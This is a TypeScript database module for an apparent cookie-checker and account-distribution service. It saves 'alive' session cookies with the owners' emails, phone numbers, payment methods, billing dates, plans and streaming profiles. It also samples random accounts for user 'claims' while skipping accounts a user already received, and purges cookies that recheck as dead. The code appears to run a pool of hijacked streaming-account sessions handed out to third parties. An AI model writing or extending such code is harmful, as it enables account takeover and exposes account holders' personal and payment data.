import { createHash } from "node:crypto"
import { sql, dbEnabled } from "@/lib/db"
import type { CheckResult } from "@/lib/normalize-upstream"
import { normalizePlan, planMatchLikePatterns } from "@/lib/cookie-utils"
import { encryptCookie, decryptCookie } from "@/lib/cookie-crypto"

// A persisted alive cookie plus the parsed account details, as returned to the UI.
export type SavedCookie = {
  id: string
  cookie: string
  email: string | null
  plan: string | null
  countryCode: string | null
  paymentMethod: string | null
  nextBillingCycle: string | null
  memberSince: string | null
  phone: string | null
  maxStreams: number | null
  emailVerified: boolean | null
  profiles: string[] | null
  links: { pc?: string; mobile?: string; tv?: string } | null
  createdAt: string
  updatedAt: string
}

// One alive entry to persist (cleaned cookie string + its parsed result).
export type AliveEntry = {
  cookie: string
  result: CheckResult
}

// Stable per-account key so re-checking a rotating session does not create rows.
// Prefer the verifier's authoritative accountId, then email, and only fall back to
// the cookie when the upstream returned neither identity field.
function accountFingerprint(accountId: string | null | undefined, email: string | null | undefined, cookie: string): string {
  const normalizedId = accountId?.trim()
  const normalizedEmail = email?.trim().toLowerCase()
  const basis = normalizedId
    ? `account:${normalizedId}`
    : normalizedEmail
      ? `email:${normalizedEmail}`
      : `cookie:${cookie.trim()}`
  return createHash("sha256").update(basis).digest("hex")
}

// Maps a raw DB row (snake_case) into the camelCase API shape.
function mapRow(row: Record<string, unknown>): SavedCookie {
  return {
    id: String(row.id),
    // Stored encrypted (AES-256-GCM) when COOKIE_ENCRYPTION_KEY is set; legacy
    // plaintext rows pass through unchanged. See lib/cookie-crypto.ts.
    cookie: decryptCookie(String(row.cookie ?? "")),
    email: (row.email as string) ?? null,
    plan: (row.plan as string) ?? null,
    countryCode: (row.country_code as string) ?? null,
    paymentMethod: (row.payment_method as string) ?? null,
    nextBillingCycle: (row.next_billing_cycle as string) ?? null,
    memberSince: (row.member_since as string) ?? null,
    phone: (row.phone as string) ?? null,
    maxStreams: row.max_streams == null ? null : Number(row.max_streams),
    emailVerified: row.email_verified == null ? null : Boolean(row.email_verified),
    profiles: Array.isArray(row.profiles) ? (row.profiles as string[]) : null,
    links: (row.links as SavedCookie["links"]) ?? null,
    createdAt: new Date(row.created_at as string).toISOString(),
    updatedAt: new Date(row.updated_at as string).toISOString(),
  }
}

// Upserts a batch of alive cookies. Returns how many rows were inserted as new
// (existing fingerprints are refreshed in place and not counted as "saved").
export async function saveAliveCookies(entries: AliveEntry[]): Promise<{ saved: number }> {
  if (!sql || entries.length === 0) return { saved: 0 }

  // De-dupe within the incoming batch by ACCOUNT fingerprint (last write wins),
  // so two cookies for the same email collapse to a single saved row.
  const byPrint = new Map<string, AliveEntry>()
  for (const e of entries) {
    const cookie = e.cookie?.trim()
    if (!cookie) continue
    byPrint.set(accountFingerprint(e.result?.accountId, e.result?.email, cookie), e)
  }

  let saved = 0
  for (const [fp, { cookie, result }] of byPrint) {
    const email = result.email?.trim().toLowerCase()
    // Encrypt the session BEFORE it touches the DB. The fingerprint above is
    // computed from the PLAINTEXT cookie so dedup still works; only the stored
    // blob is encrypted.
    const storedCookie = encryptCookie(cookie)
    // Belt-and-suspenders: if this account was previously stored under a
    // different fingerprint (e.g. the old cookie-based scheme), drop those rows
    // first so the same email can never appear twice.
    if (email) {
      await sql`
        DELETE FROM saved_cookies
        WHERE lower(email) = ${email} AND fingerprint <> ${fp}
      `
    }

    const rows = (await sql`
      INSERT INTO saved_cookies (
        fingerprint, cookie, email, plan, country_code, payment_method,
        next_billing_cycle, member_since, phone, max_streams, email_verified,
        profiles, links, raw, updated_at
      ) VALUES (
        ${fp}, ${storedCookie}, ${result.email ?? null}, ${normalizePlan(result.plan) ?? null},
        ${result.countryCode ?? null}, ${result.paymentMethod ?? null},
        ${result.nextBillingCycle ?? null}, ${result.memberSince ?? null},
        ${result.phone ?? null}, ${result.maxStreams ?? null}, ${result.emailVerified ?? null},
        ${JSON.stringify(result.profiles ?? null)}, ${JSON.stringify(result.links ?? null)},
        ${JSON.stringify(result.raw ?? null)}, now()
      )
      ON CONFLICT (fingerprint) DO UPDATE SET
        cookie = EXCLUDED.cookie,
        email = EXCLUDED.email,
        plan = EXCLUDED.plan,
        country_code = EXCLUDED.country_code,
        payment_method = EXCLUDED.payment_method,
        next_billing_cycle = EXCLUDED.next_billing_cycle,
        member_since = EXCLUDED.member_since,
        phone = EXCLUDED.phone,
        max_streams = EXCLUDED.max_streams,
        email_verified = EXCLUDED.email_verified,
        profiles = EXCLUDED.profiles,
        links = EXCLUDED.links,
        raw = EXCLUDED.raw,
        updated_at = now()
      RETURNING (xmax = 0) AS inserted
    `) as { inserted: boolean }[]
    if (rows[0]?.inserted) saved++
  }

  return { saved }
}

// Lists saved cookies, newest first. By default returns ALL saved cookies (no
// cap) so the admin shows the complete database; pass an explicit `limit` only
// when a bounded slice is needed.
export async function listSavedCookies(limit?: number): Promise<SavedCookie[]> {
  if (!sql) return []
  const rows = (
    limit && Number.isFinite(limit)
      ? await sql`
          SELECT id, cookie, email, plan, country_code, payment_method, next_billing_cycle,
                 member_since, phone, max_streams, email_verified, profiles, links,
                 created_at, updated_at
          FROM saved_cookies
          ORDER BY created_at DESC
          LIMIT ${limit}
        `
      : await sql`
          SELECT id, cookie, email, plan, country_code, payment_method, next_billing_cycle,
                 member_since, phone, max_streams, email_verified, profiles, links,
                 created_at, updated_at
          FROM saved_cookies
          ORDER BY created_at DESC
        `
  ) as Record<string, unknown>[]
  return rows.map(mapRow)
}

// Admin listing WITHOUT the cookie blob. Returns every display field (email, plan,
// country, dates, profiles, links, …) but omits the multi-KB encrypted `cookie`
// column — so `mapRow` yields cookie:"". This is what the admin Saved dashboard
// loads on each visit; dropping the blob cuts that read by ~95% (the cookie is by
// far the largest column), keeping data transfer tiny even with thousands of rows.
// The actual cookie is fetched on demand via loadSavedCookiesByIds only when the
// operator copies / downloads / rechecks specific accounts.
export async function listSavedCookieDetails(): Promise<SavedCookie[]> {
  if (!sql) return []
  const rows = (await sql`
    SELECT id, email, plan, country_code, payment_method, next_billing_cycle,
           member_since, phone, max_streams, email_verified, profiles, links,
           created_at, updated_at
    FROM saved_cookies
    ORDER BY created_at DESC
  `) as Record<string, unknown>[]
  return rows.map(mapRow)
}

export async function countSavedCookies(): Promise<number> {
  if (!sql) return 0
  const rows = (await sql`SELECT COUNT(*)::int AS count FROM saved_cookies`) as { count: number }[]
  return rows[0]?.count ?? 0
}

// Per (plan, country) availability counts for rows that HAVE a cookie, aggregated
// in SQL. Returns at most a few dozen rows regardless of pool size, so it transfers
// almost nothing — unlike listSavedCookies(), which streams every full cookie blob
// (multi-KB each) plus JSON. This is what getPoolOptions uses on every generator
// page load, so page views no longer drag the entire table out of the database
// (the root cause of the data-transfer quota being exhausted).
export type PoolSummaryRow = { plan: string | null; country: string | null; count: number }
export async function summarizeSavedCookies(): Promise<PoolSummaryRow[]> {
  if (!sql) return []
  return (await sql`
    SELECT plan, country_code AS country, COUNT(*)::int AS count
    FROM saved_cookies
    WHERE cookie IS NOT NULL AND cookie <> ''
    GROUP BY plan, country_code
  `) as PoolSummaryRow[]
}

// Lightweight metadata (id + plan + country ONLY, no cookie blob / JSON) for every
// row that has a cookie. The distribution engine uses this to partition/shuffle the
// whole pool cheaply, then fetches the actual cookie for just the handful of
// candidates it live-verifies via loadSavedCookiesByIds — so a claim never pulls the
// entire table's blobs.
export type SavedCookieMeta = { id: string; plan: string | null; countryCode: string | null }
export async function listSavedCookieMeta(): Promise<SavedCookieMeta[]> {
  if (!sql) return []
  const rows = (await sql`
    SELECT id, plan, country_code
    FROM saved_cookies
    WHERE cookie IS NOT NULL AND cookie <> ''
    ORDER BY created_at DESC
  `) as { id: number; plan: string | null; country_code: string | null }[]
  return rows.map((r) => ({ id: String(r.id), plan: r.plan, countryCode: r.country_code }))
}

// BOUNDED candidate sample for a single claim. Instead of pulling id/plan/country
// for the ENTIRE pool (which grows with every saved account and is read on every
// claim — so heavy claiming scaled egress with pool size), this returns at most
// ~2×limit rows: a random slice biased toward the requested plan+country ("preferred")
// plus a random slice of anything else ("fallback"). Egress per claim is therefore
// CONSTANT (~a few KB) no matter how large the pool grows. Plan/country matching is
// best-effort in SQL; the distribution engine re-validates every row with the exact
// normalizePlan logic and only fetches cookie blobs for the handful it live-verifies.
export async function sampleSavedCookieCandidates(opts: {
  plan: string | null
  country: string | null
  receivedIds: string[]
  limit?: number
}): Promise<SavedCookieMeta[]> {
  if (!sql) return []
  const limit = Math.max(1, Math.min(opts.limit ?? 150, 500))
  const received = (opts.receivedIds ?? []).map(Number).filter(Number.isInteger)
  // Sentinel avoids empty-array typing issues; no real serial id is -1.
  const receivedArr = received.length ? received : [-1]
  const country = opts.country || null
  const patterns = planMatchLikePatterns(opts.plan)
  const patternsArr = patterns ?? ["%"]
  const noPlan = patterns === null

  type Row = { id: number; plan: string | null; country_code: string | null }
  // Preferred: matches the requested plan AND country (best-effort), excluding
  // accounts this user already received.
  const preferred = (await sql`
    SELECT id, plan, country_code
    FROM saved_cookies
    WHERE cookie IS NOT NULL AND cookie <> ''
      AND NOT (id = ANY(${receivedArr}))
      AND (${country}::text IS NULL OR country_code = ${country})
      AND (${noPlan} OR plan ILIKE ANY(${patternsArr}))
    ORDER BY random()
    LIMIT ${limit}
  `) as Row[]
  // Fallback: any other account, random. Overlap with preferred is deduped below.
  const fallback = (await sql`
    SELECT id, plan, country_code
    FROM saved_cookies
    WHERE cookie IS NOT NULL AND cookie <> ''
      AND NOT (id = ANY(${receivedArr}))
    ORDER BY random()
    LIMIT ${limit}
  `) as Row[]

  const seen = new Set<string>()
  const out: SavedCookieMeta[] = []
  for (const r of [...preferred, ...fallback]) {
    const id = String(r.id)
    if (seen.has(id)) continue
    seen.add(id)
    out.push({ id, plan: r.plan, countryCode: r.country_code })
  }
  return out
}

// Returns just the ids of every saved cookie, oldest first. Used to snapshot a
// background recheck job (the chunked worker loads each slice by id).
export async function listAllSavedCookieIds(): Promise<string[]> {
  if (!sql) return []
  const rows = (await sql`SELECT id FROM saved_cookies ORDER BY id ASC`) as { id: number }[]
  return rows.map((r) => String(r.id))
}

// Loads full saved-cookie rows for a specific set of ids (used by the chunked
// background recheck so each continuation only fetches its slice).
export async function loadSavedCookiesByIds(ids: string[]): Promise<SavedCookie[]> {
  if (!sql || ids.length === 0) return []
  const numeric = ids.map(Number).filter(Number.isInteger)
  if (numeric.length === 0) return []
  const rows = (await sql`
    SELECT id, cookie, email, plan, country_code, payment_method, next_billing_cycle,
           member_since, phone, max_streams, email_verified, profiles, links,
           created_at, updated_at
    FROM saved_cookies
    WHERE id = ANY(${numeric})
  `) as Record<string, unknown>[]
  return rows.map(mapRow)
}

// Deletes a single saved cookie by id. Returns true if a row was removed.
export async function deleteSavedCookie(id: string): Promise<boolean> {
  if (!sql) return false
  const numericId = Number(id)
  if (!Number.isInteger(numericId)) return false
  const rows = (await sql`DELETE FROM saved_cookies WHERE id = ${numericId} RETURNING id`) as { id: number }[]
  return rows.length > 0
}

// Bulk-deletes saved cookies by id in a single round-trip. Used by the 24h
// maintenance job to purge cookies that re-validated as dead/expired.
export async function removeSavedCookies(ids: string[]): Promise<number> {
  if (!sql || ids.length === 0) return 0
  const numeric = ids.map(Number).filter(Number.isInteger)
  if (numeric.length === 0) return 0
  const rows = (await sql`DELETE FROM saved_cookies WHERE id = ANY(${numeric}) RETURNING id`) as { id: number }[]
  return rows.length
}

// Removes every saved cookie. Returns the number of rows deleted.
export async function clearSavedCookies(): Promise<number> {
  if (!sql) return 0
  const rows = (await sql`DELETE FROM saved_cookies RETURNING id`) as { id: number }[]
  return rows.length
}

export { dbEnabled }
